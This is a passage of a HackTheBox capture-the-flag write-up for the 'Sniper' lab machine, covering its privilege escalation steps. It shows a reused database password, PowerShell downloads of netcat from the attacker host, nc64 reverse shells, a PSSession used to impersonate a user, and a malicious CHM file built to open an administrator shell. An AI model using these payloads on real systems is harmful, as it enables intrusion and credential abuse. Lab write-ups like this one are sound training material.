<p><span alt="image" data-base62-sha1="pNcPviEX4XgJfqLLrMYlLbTr4Uh" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<hr>
<h2>Privilege Escalation <span class="hashtag">#1:</span> Passwsord Reuse + PSSession</h2>
<p>The user folder has an old version of the registration page but the most interesting part is the db.php file in the same directory, which has the database credentials in it:</p>
<pre><code class="lang-php">&lt;?php
// Enter your Host, username, password, database below.
// I left password empty because i do not set password on localhost.
$con = mysqli_connect("localhost","dbuser","36mEAhz/B8xQ~2VM","sniper");
// Check connection
if (mysqli_connect_errno())
  {
  echo "Failed to connect to MySQL: " . mysqli_connect_error();
  }
?&gt;
</code></pre>
<p>At first I didn’t mind it too much and started enumerating MySQL by creating PHP pages to query it for all its databases and tables but with no great results (the only thing I found was an MD5 hash for a “superuser” user which I could not crack).</p>
<p>After a little break and some thinking I forgot to check for one of the weaknesses I so often underestimate: password reuse. I found out the database password is basically Chris’ account password, I verified this with smbclient by being able to list the shares with his account:</p>
<pre><code class="lang-auto">baud@kali:~/HTB/sniper$ smbclient -U chris -L \\\\10.10.10.151
Enter WORKGROUP\chris's password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
</code></pre>
<p>As established at the beginning, anonymous users are not allowed to list shares on the box, meaning the credentials are correct:</p>
<pre><code class="lang-auto">User: chris
Pass: 36mEAhz/B8xQ~2VM
</code></pre>
<p>Still, Chris can’t access the C$ share anyway:</p>
<pre><code class="lang-auto">baud@kali:~/HTB/sniper$ smbclient -U chris \\\\10.10.10.151\\C$
Enter WORKGROUP\chris's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
</code></pre>
<p>With a set of working credentials and nowhere to use them I was forced to drop files on the box. My first try was with the nc-family of binaries, using this command:</p>
<pre><code class="lang-auto">powershell -command iwr http://10.10.14.144/ncat.exe -outfile \"c:\users\all users\data\ncat.exe\""
</code></pre>
<p>But Defender is always ready to stop the fun by flagging the binaries. Here’s what I tried downloading and what worked:</p>
<pre><code class="lang-auto">nc --&gt; flagged
ncat --&gt; flagged
nc64 --&gt; works!
</code></pre>
<p>After downloading nc64 on the box I can call it from the web shell to contact my own host with a reverse shell:</p>
<pre><code class="lang-auto">"c:\users\all users\data\nc64.exe" -e cmd.exe 10.10.14.144 9999
</code></pre>
<p>And my listener receives a connection giving me a proper shell at last:</p>
<pre><code class="lang-auto">baud@kali:~/HTB/sniper$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49737
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\inetpub\wwwroot\blog&gt;
</code></pre>
<p>We can become Chris by starting a PSSession with his credentials, since PSSessions aren’t blocked by the CLM. First we enter the PowerShell console:</p>
<pre><code class="lang-auto">C:\inetpub\wwwroot\blog&gt;powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\inetpub\wwwroot\blog&gt;
</code></pre>
<p>Then we put the user’s password in a variable as a SecureString:</p>
<pre><code class="lang-auto">PS C:\inetpub\wwwroot\blog&gt; $pw = ConvertTo-SecureString -String "36mEAhz/B8xQ~2VM" -AsPlainText -force
</code></pre>
<p>The password is used to create a PSCredential object together with the username:</p>
<pre><code class="lang-auto">PS C:\inetpub\wwwroot\blog&gt; $pp = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList ".\chris", $pw
</code></pre>
<p>Now the Enter-PSSession cmdlet can be used to start a PSSession using that PSCredential object, which makes us impersonate Chris:</p>
<pre><code class="lang-auto">PS C:\inetpub\wwwroot\blog&gt; Enter-PSSession -ComputerName localhost -Credential $pp
[localhost]: PS C:\Users\Chris\Documents&gt;
</code></pre>
<p>I downloaded nc64.exe again to get a proper reverse shell instead of the uncomfortable PSSession:</p>
<pre><code class="lang-auto">[localhost]: PS C:\Users\Chris\Documents&gt; Invoke-Command -ScriptBlock { IWR http://10.10.14.144/nc64.exe -outfile C:\Users\Chris\Documents\nc64.exe }
[localhost]: PS C:\Users\Chris\Documents&gt; Invoke-Command -ScriptBlock { C:\Users\Chris\Documents\nc64.exe -e cmd.exe 10.10.14.144 9090 }
</code></pre>
<p>I could have easily used the already downloaded nc64 but for some reason I was having issues navigating folders inside the PSSession so it was more comfortable to have another nc64 in the . directory. The new incoming connection is caught and we have a shell as Chris:</p>
<pre><code class="lang-auto">baud@kali:~/HTB/sniper$ nc -lvnp 9090
listening on [any] 9090 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49779
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Chris\Documents&gt;dir /a
dir /a
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Users\Chris\Documents

02/28/2020  02:53 PM    &lt;DIR&gt;          .
02/28/2020  02:53 PM    &lt;DIR&gt;          ..
04/11/2019  06:04 AM               402 desktop.ini
04/11/2019  06:04 AM    &lt;JUNCTION&gt;     My Music [C:\Users\Chris\Music]
04/11/2019  06:04 AM    &lt;JUNCTION&gt;     My Pictures [C:\Users\Chris\Pictures]
04/11/2019  06:04 AM    &lt;JUNCTION&gt;     My Videos [C:\Users\Chris\Videos]
02/28/2020  02:53 PM            45,272 nc64.exe
               2 File(s)         45,674 bytes
               5 Dir(s)  17,932,124,160 bytes free

C:\Users\Chris\Documents&gt;
</code></pre>
<p>While the user flag is in Chris’ desktop, his downloads folder contains an interesting instructions.chm file:</p>
<pre><code class="lang-auto">C:\Users\Chris&gt;dir /a downloads
dir /a downloads
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of C:\Users\Chris\downloads

04/11/2019  07:36 AM    &lt;DIR&gt;          .
04/11/2019  07:36 AM    &lt;DIR&gt;          ..
04/11/2019  06:04 AM               282 desktop.ini
04/11/2019  07:36 AM            10,462 instructions.chm
               2 File(s)         10,744 bytes
               2 Dir(s)  17,932,124,160 bytes free

C:\Users\Chris&gt;
</code></pre>
<p>CHM files are typically shipped witht a program, containing its official documentation. The file can be transfered to us for analysis via nc64:</p>
<pre><code class="lang-auto">C:\Users\Chris\Downloads&gt;..\Documents\nc64.exe -w 3 10.10.14.144 9191 &lt; instructions.chm
</code></pre>
<p>And saved locally like this:</p>
<pre><code class="lang-auto">baud@kali:~/HTB/sniper$ nc -lvnp 9191 &gt; instructions.chm
listening on [any] 9191 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49810
baud@kali:~/HTB/sniper$ file instructions.chm 
instructions.chm: MS Windows HtmlHelp Data
</code></pre>
<p>This is what the file looks like:</p>
<p><span alt="image" data-base62-sha1="ecvYYcKzoO9VWnj0wFmoSEWBTuO" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>This shitty work Chris is talking about is mentioned in the note.txt file in C:\Docs, where we get to appreciate the relationship between this evil CEO and poor coder Chris:</p>
<pre><code class="lang-auto">C:\Users\Chris\Downloads&gt;dir /a c:\docs
dir /a c:\docs
 Volume in drive C has no label.
 Volume Serial Number is 6A2B-2640

 Directory of c:\docs

10/01/2019  12:04 PM    &lt;DIR&gt;          .
10/01/2019  12:04 PM    &lt;DIR&gt;          ..
04/11/2019  08:31 AM               285 note.txt
04/11/2019  08:17 AM           552,607 php for dummies-trial.pdf
               2 File(s)        552,892 bytes
               2 Dir(s)  17,930,002,432 bytes free

C:\Users\Chris\Downloads&gt;more c:\docs\note.txt
more c:\docs\note.txt
Hi Chris,
        Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you've prepared the documentation for our new app. Drop it here when you're done with it.

Regards,
Sniper CEO.

C:\Users\Chris\Downloads&gt;
</code></pre>
<p>I absolutely love the “PHP for dummies” pdf in the directory just to tease him further on his bad PHP skills. Anyway he mentions dropping the documentation in the Docs folder, probably in CHM format because the file from earlier was supposed to be the Android app documentation.</p>
<hr>
<h2>Privilege Escalation <span class="hashtag">#2:</span> RCE With CHM File</h2>
<p>It’s obvious that we have to finish Chris’ job and make a malicious CHM file that the Administrator will open at one point.</p>
<p>Using <a href="https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7" rel="nofollow noopener">this</a> GitHub page as reference I started running a few tests locally after installing the HTML Help WorkShop on a Windows 10 box. I’m pretty sure there’s a way to craft CHM files on Linux too but if I remember correctly it involves Wine and when I use Wine nothing works, so I went the Windows way.</p>
<p>This is the base code provided by GitHub:</p>
<pre><code class="lang-auto">&lt;OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1&gt;
  &lt;PARAM name="Command" value="ShortCut"&gt;
  &lt;PARAM name="Button" value="Bitmap::shortcut"&gt;
  &lt;PARAM name="Item1" value=',cmd.exe,/c copy /Y C:\Windows\system32\rundll32.exe %TEMP%\out.exe &gt; nul &amp;&amp; %TEMP%\out.exe javascript:"\..\mshtml RunHTMLApplication ";document.write();h=new%20ActiveXObject("WinHttp.WinHttpRequest.5.1");h.Open("GET","http://127.0.0.1:8000/test.vbs",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im out.exe",0,true);}'&gt;
  &lt;PARAM name="Item2" value="273,1,1"&gt;
&lt;/OBJECT&gt;
&lt;SCRIPT&gt;
  x.Click();
&lt;/SCRIPT&gt;
</code></pre>
<p>Basically the code simulates a button that presses itself triggering the payload contained in Item1, which is far more complicated than it needs to be for this single challenge so I’ll make it simpler.</p>
<p>After obtaining the a.html file contained in the original CHM found on the box by unpacking it with 7zip we can simply change the code to make it look like this:</p>
<pre><code class="lang-auto">&lt;html&gt;
&lt;body&gt;
&lt;h1&gt;Sniper Android App Documentation&lt;/h1&gt;
&lt;OBJECT id=x classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11" width=1 height=1&gt;
  &lt;PARAM name="Command" value="ShortCut"&gt;
  &lt;PARAM name="Button" value="Bitmap::shortcut"&gt;
  &lt;PARAM name="Item1" value=',cmd.exe,/c c:\users\chris\documents\nc64.exe -e cmd.exe 10.10.14.144 6666'&gt;
  &lt;PARAM name="Item2" value="273,1,1"&gt;
&lt;/OBJECT&gt;
&lt;SCRIPT&gt;
  x.Click();
&lt;/SCRIPT&gt;
&lt;h2&gt;Table of Contents&lt;/h2&gt;

&lt;p&gt;Pff... This dumb CEO always makes me do all the shitty work. SMH!&lt;/p&gt;
&lt;p&gt;I'm never completing this thing. Gonna leave this place next week. Hope someone snipes him.&lt;/p&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>This reuses the nc64 binary dropped in Chris’ folder to start yet another reverse shell. Create a new project in the HTML Help WorkShop with that code and compile it, then drop the output CHM file in C:\Docs and soon enough what I can only presume to be the CEO will open it giving us a shell as the Administrator:</p>
<pre><code class="lang-auto">baud@kali:~/HTB/sniper$ nc -lvnp 6666
listening on [any] 6666 ...
connect to [10.10.14.144] from (UNKNOWN) [10.10.10.151] 49812
Microsoft Windows [Version 10.0.17763.678]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
sniper\administrator

C:\Windows\system32&gt;
</code></pre>
<p>And that was Sniper.</p>
          <p><a href="https://d.clarkee.co.uk/t/hackthebox-writeup-sniper/20112/1">Read full topic</a></p>
        ]]></description>
        <link>https://d.clarkee.co.uk/t/hackthebox-writeup-sniper/20112/1</link>
        <pubDate>Sat, 28 Mar 2020 18:53:05 +0000</pubDate>
        <guid isPermaLink="false">d.clarkee.co.uk-post-20112-1</guid>
        <source url="https://d.clarkee.co.uk/t/hackthebox-writeup-sniper/20112.rss">HackTheBox Writeup: Sniper</source>
      </item>
  </channel>
</rss>
